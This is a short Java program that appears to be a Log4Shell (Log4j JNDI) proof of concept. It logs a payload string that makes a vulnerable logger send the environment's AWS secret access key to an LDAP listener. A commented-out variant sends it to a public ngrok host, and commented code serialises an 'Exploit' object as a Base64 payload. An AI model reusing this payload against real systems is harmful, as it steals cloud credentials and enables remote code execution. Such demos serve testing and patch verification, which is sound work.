package org.boilerplate.log4j;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.ObjectOutput;
import java.io.ObjectOutputStream;
import java.util.Base64;

public class App {

    private static final Logger LOGGER = LogManager.getLogger(App.class);

    public static void main(String[] args) throws Exception {
//        try(
//            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
//            ObjectOutput objectOutput = new ObjectOutputStream(byteArrayOutputStream);
//        ) {
//            objectOutput.writeObject(new Exploit());
//            final byte[] byteArray = byteArrayOutputStream.toByteArray();
//            System.out.println(Base64.getEncoder().encodeToString(byteArray));
//        }

        LOGGER.info("ENV: ${jndi:ldap://0.0.0.0:1389/q=${env:AWS_SECRET_ACCESS_KEY}}");

//        LOGGER.info("ENV: ${jndi:ldap://4.tcp.ngrok.io:18013/q=${env:AWS_SECRET_ACCESS_KEY}}");
    }
}
